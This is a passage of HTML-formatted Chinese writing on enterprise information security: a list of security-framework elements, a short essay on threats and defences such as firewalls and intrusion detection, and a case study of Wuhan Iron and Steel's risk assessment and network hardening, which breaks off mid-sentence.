11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">研究信息系统存在的漏洞缺陷、面临的风险与威胁，这可以</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">通过安全风险评估技术来实现</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">;对于可能发现的漏洞、风险，规定相应的补救方法，或者取消一些相应的服务。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; (2)行为管理：对网络行为、</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">各种操作进行实时的监控</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">;对各种行为进行分类管理，规定行为的范围和期限。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (3) 信息管理：信息是it业的重要资产，由于它的特殊性，因此必须采用特殊的方式和方法进行管理，根据具体的实际情况，对不同类型、不同敏感度的信息，规定合适的管理制度和使用方法，禁止不良信息的传播。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (4) </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">安全边界：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">信息系统与外部环境的连接处是防御外来攻击的关口，根据企业具体的业务范围，必须规定系统边界上的连接情况，防止非法用户的入侵以及系统敏感信息的外泄，如可以利用防火墙对进出的连接情况进行过滤和控制。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (5) 系统安全：操作系统是信息系统运行的基础平台，它的安全也是信息安全的基础。根据具体的安全需求，应该规定所要采用的操作系统类型、安全级别以及使用要求。为了实现这个目的，可以采用不同安全级别的操作系统，或者在现有的操作系统上添加安全外壳。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (6) </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">身份认证与授权</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">：信息系统是为广大用户提供服务的，为了区分各个用户以及不同级别的用户组，需要对他们的身份和操作的合法性进行检查。体系应该规定实现身份认证与权限检查的方式、方法以及对这些用户的管理要求。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (7) 应用安全：基于网络信息系统的应用有很多，存在的安全问题也很多。为了保证安全，应该根据安全需求规定所使用的应用的种类和范围，以及每一种应用的使用管理制度。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (8) </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">数据库安全</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">：保护数据库的安全一直是一个核心问题。为了达到这个目的，需要规定所采用的数据库系统的类型、管理、使用制度与方式。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (9) 链路安全：链路层是网络协议的下层协议，针对它的攻击一般是破坏链路通信，窃取传输的数据。为了防御这些破坏、攻击，需要规定可以采取的安全措施，如</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">链路加密机。</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; (10) 桌面系统安全：桌面系统包含着用户能够直接接触到的信息、资源，也是访问信息系统的一个入口，对它的管理和使用不当也会造成敏感信息的泄露。所以，需要对各个用户提出使用桌面系统的安全要求，进行必要的安全保护。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">(11) 病毒防治：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">随着网络技术和信息技术的发展，各种各样的病毒泛滥成灾，严重威胁着信息财产的安全。为了避免因为病毒而造成的损失，必须制定严格的病毒防护制度，减少、关闭病毒的来源，周期性对系统中的程序进行检查，利用病毒防火墙对系统中的进程进行实时监控。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">(12) 灾难恢复与备份：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">不存在绝对安全的安全防护体系，为了减少由于安全事故造成的损失，必须规定必要的恢复措施，能够使系统尽快地恢复正常的运转，并对重要的信息进行周期性的备份。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (13) 集中安全管理：为了便于安全体系的统一运转，发挥各个功能组件的功能，必须对体系实施集中的管理。因此，需要制定科学的管理制度，成立相应的管理机构。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">三、别忘了评估您的安全体系 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160; 由于安全体系的质量直接决定着安全工程的质量，因此，必须对安全体系进行严格的审查分析。在安全体系设计之后，需要聘请专家对体系的质量进行评审，并对评 审结果进行论证，对发现的不妥之处及时修正，这样才能保证体系的质量。为了保证评审结果的可靠性，所聘请的专家必须是第三方的。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160; 一个好的安全防护体系包括以下几个特点：结构的合理性及可扩展性、内容的完备性、组织上的可行性与安全性。对安全体系的质量进行评估也就是检验体系是否达 到了这几项要求。世界上没有一个通用的安全体系，某个信息网络系统的安全体系是针对该系统本身而言的，它不能用于另外的某个系统。所以，在设计安全体系 时，在一定的理论指导下，要结合具体的实际情况进行研究分析。要考察的实际情况主要是风险分析与评估、安全需求分析的内容，安全体系的设计是完整的信息安 全工程学中的一个环节，是以风险分析与评估、安全需求分析为基础的。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">----------------------------------------------------------------------------------------------------------------------</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">浅析企业信息系统的安全与防范措施 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">摘&#160; 要：随着</span><a href="http://www.studa.net/pc/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">计算</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">机技术与通信技术的高速</span><a href="http://www.studa.net/fazhan/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">发展</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">，信息安全在</span><a href="http://www.studa.net/company/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">企业</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">中扮演着越来越重要的角色，为此，笔者从企业信息系统所面临的安全威胁以及企业信息系统安全运行应当采取的防范措施两方面进行了探讨。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; 关键词：信息系统安全；防火墙技术；防范</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; 随着计算机技术与通信技术的飞速发展,信息安全已成为制约企业发展的瓶颈技术,进而使得企业对信息系统安全的依赖性达到了空前的程度,但是企业在享受着信息系统给公司带来巨大</span><a href="http://www.studa.net/Economic/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">经济</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">效 益的同时,也面临着非常大的安全风险。一旦企业信息系统受到攻击而遭遇瘫痪,整个企业就会陷入危机的境地。特别是近几年来全球范围内的计算机犯罪,病毒泛 滥,黑客入侵等几大问题, 使得企业信息系统安全技术受到了严重的威胁。因此,这就使得企业必须重新审视当前信息系统所面临的安全问题, 并从中找到针对 企业的行之有效的安全防范技术。为此,笔者首先分析了</span><a href="http://www.studa.net/dangdai/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">现代</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">企业所面临的信息系统安全问题,然后提出了企业应当采取的相应防范措施。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; 1企业信息系统所面临的安全威胁</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; 企业在信息系统的实际操作过程中,威胁是普遍存在且不可避免的。一般来说威胁就是企业所面临的潜在的安全隐患。个人电脑只通过一个简易的应用便可以满足普通 用户的要求,但是企业的信息系统一般都要充当多个角色,基本上都得为多个部门提供服务,其中任何一个局部的隐患都可能给整体的安全性带来致命的打击。正是 由于企业信息安全系统本身所固有的这些缺陷,必然会导致病毒与黑客的容易盛行。目前，影响企业系统安全的因素各种各样，但是其主要的威胁可以归结为以下几 个方面：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; ①黑客的蓄意攻击：随着信息技术的普及，企业一般都会利用互联网接入来加速提高本公司业务与工作绩效,黑客的恶意攻击 行为无疑会成为阻碍这一进程发展最大也最严重的威胁。其中，有来自竞争公司的幕后黑手,或者来自对本企业有怨恨情绪的员工，以及对该企业持不满态度的顾客 等,出于不同目的或报复情绪都可能对企业</span><a href="http://www.studa.net/network/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">网络</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">进行破坏与盗 窃。另外,一个更严重的问题——网络敲诈,正有逐步提升的趋势。许多不法分子利用木马、病毒、间谍软件,或者dos 攻击等非法方式对企业网络进行破坏或 盗用企业数据,并以此作为向企业敲诈勒索的交换条件,由于大部分企业普遍存在着信息安全环等薄弱问题,因此很多企业都成为这种违法行为最大的受害者。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; ② 病毒木马的破坏：现今的互联网已基本成为了一个病毒肆虐生长繁殖的土壤,几乎每一天都会有上百种新的病毒或者木马产生,而在很大部分企业中,安全技术不 足，管理设备松散、员工安全意识淡薄等问题的存在进一步滋长了病毒、蠕虫、木马等的危害,严重时甚至有可能造成整个企业网络的瘫痪,导致企业业务无法正常 进行。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; ③员工对信息网的误用：如企业技术员工由于安全配置不当引起的安全漏洞,员工安全意识薄弱,用户密码选择不恰当,将自己的账户名与口令随意告诉他人或与别人共享都会对信息系统安全带来威胁。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; ④技术缺陷：由于当前人类认知能力和技术发展的有限性,要想使硬件和软件设计都达到完美没有缺陷,基本上不可能。其次,网络硬件、软件产品多数依靠进口等这些隐患都可能可造成网络的安全问题。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; 2企业信息系统安全运行的防范措施</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; 企业信息系统安全运行的防范措施是企业信息系统高效运行的方针,其能在很大程度上确保信息系统安全有效的运行。相应的企业安全运行的措施一般可以分为以下几类：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">① 安全认证机制：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">安全认证机制是确保企业信息系统安全的一种常用技术,主要用来防范对系统进行主动攻击的恶意行为。安全认证,一方面需要验证信息发送者的真 实性,防止出现不真实;另一方面可以防止信息在传送或存储过程中被篡改、重放或延迟的可能。一般来说，安全认证的实用技术主要由身份识别技术和数字签名技 术组成。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">②数据的加密以及解密</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">：数据的加密与解密主要是用来防止存储介质的非法被窃或拷贝,以及信息传输线路因遭窃听而造成一些重要数据的泄漏,故在系统中应对重要数据进行加密存储与传输等安全保密措施。加密是把</span><a href="http://www.studa.net/company/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">企业</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">数据转换成不能直接辨识与理解的形式;而解密是加密的逆行式即把经过加密以后的信息、数据还原为原来的易读形式。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">③入侵检测系统的配备：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">入侵检测系统是最近几年来才出现的</span><a href="http://www.studa.net/network/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">网络</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">安全技术,它通过提供实时的入侵检测,监视网络行为并进而来识别网络的入侵行为,从而对此采取相应的防护措施。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">④采用防火墙技术</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">：防火墙技术是为了确保网络的安全性而在内部和外部之间构建的一个保护层。其不但能够限制外部网对内部网的访问,同时也能阻止内部网络对外部网中一些不健康或非法信息的访问。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">⑤加强信息管理：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">在企业信息系统的运行过程中,需要要对全部的信息进行管理,对经营活动中的物理格式和</span><a href="http://www.studa.net/dianzijixie/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">电子</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">格式的信息进行分类并予以控制,将所有抽象的信息记录下来并存档。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; 3结语</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160; 总 之，企业信息系统的安全问题将会越来越得到人们的重视,其不但是一个技术难,同时更是一个管理安全的问题。企业信息系统安全建设是一个非常复杂的系统工 程。因此,企业必须综合考虑各种相关因素,制定合理的目标、规划相应的技术方案等。笔者相信，信息安全技术必将随着网络技术与通信技术的</span><a href="http://www.studa.net/fazhan/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">发展</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">而不断得到完善。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">----------------------------------------------------------------------------------------------------------------------------</span> <br /> <br /> <h1><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">武钢信息安全体系的建立与实践</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span></h1> <p> <span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">作为新中国成立后兴建的第一个特大型钢铁联合企业，武汉钢铁(集团)公司拥有从矿山采掘、炼焦、炼铁、炼钢、轧钢及配套公辅设施等一整套先进的钢铁 生产工艺设备，生产规模逾3000万吨，居世界钢铁行业第七位，国内第三位。近年来，随着武钢信息化平台的高度发展，武钢的业务运营对信息系统的依赖性越 来越高，信息系统的安全运行成为影响武钢研发，生产、销售的首要问题。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none"> 一、武钢信息安全需求</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 武钢信息系统是武钢信息化战略的主要载体，为武钢集团各项业务活动以及生产管理控制活动提供了重要服务。现在，武钢已经形成了以公司主干网为核心运行平 台、产销资讯系统为核心应用、各单位为基本用户的运行模式，其用户分布在武钢各生产、管理职能部门。作为武钢业务运营命脉的整体产销资讯系统主要包含九大 系统:型线棒产销管理系统、硅钢产销管理系统、储区优化管理系统、客户关系及电子商务管理系统、物流供应链含理系统、设备及工程管理系统、决策支持管理系 统、电能无线计虽管理系统和信息门户管理系统。其特点是集生产、办公、管理于一体，使得武钢能够提高工作效率及客户满意度，降低成本，加强了企业的市场竞 争力。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 在武钢信息化水平达到一定高度后，信息安全问题也随之而来。作为国务院信息化工作办公室推选的ISO/IEC27001信息安 全体系企业试点单位，武钢对安全的理解也实现了从网络安全到信息安全的跨越。从2004年的信息安全风险评估项目到2005年的信息安全加固项目;从到 2007年的武钢主干站点综合防护项目，到2009年的武钢防病毒及桌面管理系统升级项目和武钢主干站点综合扩点等项目，武钢信息安全体系建设的脚步越走 越稳。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none"> 二、风险评估和整体规划</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 保障信息安全，首先要明确安全目标，界定安全 边界，进而建立信息安全保障的管理和运行体系，达到融安全管理于日常工作的效果。因此，首先需要对武钢</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">进行整体的信息安全风险评估</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">。武钢风险评估的目标是 根据调查分析的结果，结合武钢信息系统的实际情况，分析系统面临的各项威胁因素;综合信息系统关键资产重要性、安全需求、现有防护措施等，评估各项威胁对武钢信息系统造成的影响，并根据影响的大小提出需要进行考虑的安全策略。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 通过信息安全风险评估，我们识别出对武钢产销系统和骨干网影响最大的三个信息安全威胁是:混合型病毒和恶意代码;外部人员通过网络实施对信息系统的入侵攻击;内部人员通过网络的直接入侵和不规范操作。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 根据风险评估结论，同时结合武钢信息系统实际情况，参考ISO27001、COBIT等国际、国家相关标准，一套适合武钢发展的、先进的安全技术体系结 构得以提出。在规划设计时，遵循安全策略中“深度防御战略”的多层防护原则，覆盖武钢信息系统中的主干网、公司级应用、接入单位系统等，主要从调整公司服 务器部署、提高安全性、增强网络安全保护、利用现有设备和新增防火墙进行网络安全域划分与加强访问控制来保护重要单位、网络综合监管平台构建(网络设备日 志、流量等)、微软操作系统补丁分发与更新与漏洞检查、公司重要服务器审计及安全策略配置加固以及终端配置管理、接入管理等方面着手。通过此次安全规划， 武钢提出了安全整体策略规划、运行安全规划、技术安全规划三份完整详尽的安全规划报告，以及切实可行的信息安全整体规划。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none"> 三、信息安全技术体系建设框架</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 在信息系统安全体系结构中，信息的安全主要依赖于信息基础设施对关键信息的处理、存储和传输的安全的保护。信息保障依赖人、操作和技术来实现组织的任 务、业务运作。针对技术、信息基础设施的管理活动同样依赖于这三个因素。稳定的信息保障体系意味着信息保障的政策、步骤，技术与机制在整个组织的信息基础 设施的所有层面上均得以实施。为了实现“深度防御”目标，需要在网络基础环境安全，边界安全、计算环境安全和支撑性安全基础设施四个方面进行设计。总体安 全技术体系框架如下图所示:</span><img src="/assets/Xsf9mwXwQ6daEJ3s41-eV6QS_yxVGfk39VL6GNhl08OvisSWhTBTw3ZQlh3_2VoRllSTxfSKoWQDnyYyZF-F7zZwSXZ8hzWJvVuCajRTG7OzUZr7rg" width="545" height="383" /> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 根据上述技术体系框架，公司逐步实施了一系列信息系统安全项目，这些项目都顺利完成，并且达到了预期的安全目标。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">四、信息安全体系约束下的应用实践</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 2005年1月，武钢正式按照技术安全规到进行了产销系统和骨干网的安全加固工程。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 在这次工程中，武钢对公司网络做了优化，实现</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">路由双核心</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">.以及站点用户访问大型机数据的</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">链路冗余</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">。对访问</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Internet擞据和访问大型机数据的路径进 行分离</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">，同时采用路由过滤和屏蔽功能，来防止非法路由条目扩散到核心而引起路由冲突。利用封锁部分常用蠕虫病毒端口及封锁发往私有地址空间的数据，保证了 网络带宽的有效利用。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 通过Symantec 